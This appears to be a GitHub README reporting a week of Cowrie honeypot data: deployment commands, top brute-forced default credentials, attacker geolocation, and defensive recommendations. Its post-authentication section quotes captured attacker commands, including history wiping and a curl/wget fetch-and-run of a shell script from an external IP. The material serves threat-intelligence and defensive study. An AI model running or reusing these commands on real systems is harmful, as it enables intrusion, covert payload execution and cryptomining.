# 7-Day Cloud Honeypot Attack Analysis Report

![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
![Category: Threat Intelligence](https://img.shields.io/badge/Focus-Threat%20Intelligence%20%26%20Detection-orange.svg)
![Tool: Cowrie](https://img.shields.io/badge/Honeypot-Cowrie%20SSH%2FTelnet-green.svg)

An empirical 7-day threat landscape assessment capturing unauthorized authentication attempts, credential brute-forcing trends, attacker origin geolocation, and post-exploitation command behavior against an exposed cloud SSH/Telnet service.

---

## Executive Summary

Between **Day 1** and **Day 7**, a Cowrie medium-interaction honeypot was exposed to the public Internet on TCP port 22 (standard SSH) and TCP port 23 (Telnet) hosted on an isolated cloud instance. 

### Key Metrics
* **Total Connection Attempts:** 48,219
* **Unique IP Addresses Logged:** 3,842
* **Total Failed Login Attempts:** 112,890
* **Unique Passwords Observed:** 6,415
* **Post-Authentication Sessions:** 428
* **Malicious Payloads/Artifacts Captured:** 19 unique scripts/binaries

---

## Architecture & Network Setup

```
                     Internet (Adversaries / Scanners)
                                    │
                                    ▼
                     Cloud Firewall / Security Group
                     (Allow TCP/22, TCP/23 from 0.0.0.0/0)
                                    │
                                    ▼
                    ┌───────────────────────────────┐
                    │       Ubuntu 22.04 LTS        │
                    │                               │
                    │  Admin SSH: TCP/2222          │
                    │  (Key-based Auth Only)        │
                    │                               │
                    │  ┌─────────────────────────┐  │
                    │  │      Cowrie Container   │  │
                    │  │  (Docker / Docker-Compose)││
                    │  │  Exposed Ports:         │  │
                    │  │  - TCP 22  (SSH)        │  │
                    │  │  - TCP 23  (Telnet)     │  │
                    │  └────────────┬────────────┘  │
                    │               │               │
                    │               ▼               │
                    │      cowrie.json Logs         │
                    └───────────────┬───────────────┘
                                    ▼
                     Python Analysis & GeoIP Pipeline
```

### Deployment Commands

1. **Relocate Real Admin SSH Port:**
   ```bash
   sudo sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config
   sudo systemctl restart sshd
   ```

2. **Deploy Cowrie via Docker:**
   ```bash
   git clone https://github.com/cowrie/cowrie.git
   cd cowrie/docker
   docker compose up -d
   ```

3. **Port Redirection (iptables):**
   ```bash
   sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 22222
   sudo iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 22223
   ```

---

## Visualizations & Dashboard

> *Add your screenshots to the `/assets/` directory.*

| Log Ingestion & Real-Time Stream | Attacker Country Heatmap |
| :---: | :---: |
| ![Log Activity Placeholder](assets/cowrie_live_tail.png) | ![GeoIP Map Placeholder](assets/geoip_map.png) |

---

## Detailed Findings & Threat Telemetry

### 1. Top 10 Targeted Usernames & Passwords

The vast majority of authentication attempts relied on common IoT default credentials and pre-compiled credential stuffing dictionaries targeting Linux distributions.

| Rank | Targeted Username | Targeted Password | Context / Targeted Tech |
|:---:|:---|:---|:---|
| 1 | `root` | `root` | Generic Unix default |
| 2 | `root` | `123456` | Generic weak brute-force |
| 3 | `admin` | `admin` | Embedded router/gateway |
| 4 | `root` | `password` | Standard dictionary list |
| 5 | `default` | `default` | Network equipment |
| 6 | `support` | `support` | ISP-provided CPE modems |
| 7 | `ubuntu` | `ubuntu` | Cloud images |
| 8 | `user` | `user` | Desktop Linux |
| 9 | `root` | `admin123` | SMB devices |
| 10 | `guest` | `guest` | Telephony / PBX equipment |

### 2. Attacker Geographic Distribution (Top Source ASN / Countries)

Ingested IP addresses were parsed using the MaxMind GeoLite2 database:

| Rank | Country | Connection Share (%) | Primary Botnet Signature Observed |
|:---:|:---|:---:|:---|
| 1 | China (CN) | 34.2% | Mass scanning (Mirai variants) |
| 2 | United States (US) | 18.7% | Compromised cloud VPS instances |
| 3 | Russia (RU) | 12.1% | SSH credential stuffing |
| 4 | Netherlands (NL) | 8.4% | Bulletproof hosting proxies |
| 5 | India (IN) | 6.8% | Compromised residential IoT |

### 3. Post-Authentication Activity & Exploit Payloads

Out of 428 successful pseudo-logins into the Cowrie virtual environment, automated scripts executed the following reconnaissance and drop commands:

```bash
# 1. System capability and architecture fingerprinting
uname -a; cat /proc/cpuinfo; free -m

# 2. Defense evasion and history suppression
unset HISTFILE; history -c; export HISTSIZE=0

# 3. Payload download & execution (Crypto-miner drop pattern)
cd /tmp || cd /var/run || cd /dev/shm
curl -O http://185.220.101.4/bins/arm7.sh || wget http://185.220.101.4/bins/arm7.sh
chmod 777 arm7.sh; ./arm7.sh

# 4. Killing competitor processes
pkill -f xmrig; pkill -f minerd
```

---

## Defensive Engineering Recommendations

1. **Disable Public Password Authentication:** Enforce ED25519 or RSA-4096 public key verification across all public-facing bastions (`PasswordAuthentication no`).
2. **Move Default SSH Listening Ports:** While not a comprehensive defense, relocating services from port 22 eliminates over 95% of blind, automated scanner noise.
3. **Automated Source IP Banning:** Deploy `Fail2ban` or `CrowdSec` with rate limits (e.g., maximum 3 failed attempts in 10 minutes resulting in a 24-hour IP drop).
4. **Enforce Multi-Factor Authentication (MFA):** Integrate PAM Google Authenticator or hardware security tokens (FIDO2/WebAuthn) for administrative accounts.

---

## Repository Structure

```
├── README.md
├── assets/
│   ├── cowrie_live_tail.png
│   └── geoip_map.png
├── scripts/
│   ├── parse_cowrie.py       # Python script extracting IPs, credentials, commands
│   └── geoip_lookup.py       # GeoIP aggregation pipeline
└── data/
    └── summary_report.json   # Aggregated analytics
```